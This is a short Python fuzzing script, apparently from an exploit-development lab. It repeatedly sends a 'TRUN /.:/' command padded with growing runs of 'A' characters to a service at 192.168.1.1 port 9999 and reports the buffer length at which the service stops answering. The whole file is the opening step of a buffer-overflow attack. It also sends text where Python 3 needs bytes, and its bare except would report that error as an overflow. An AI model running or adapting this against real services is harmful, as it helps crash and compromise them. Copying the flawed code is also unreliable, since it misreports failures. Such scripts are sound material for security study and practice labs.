#!/usr/bin/python3
import sys, socket
from time import sleep

buffer = 'A'  * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.1', 9999))
        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer += 'A' * 100
    except:
        print(f'Buffer overflow at {len(buffer)} characters')
        sys.exit()
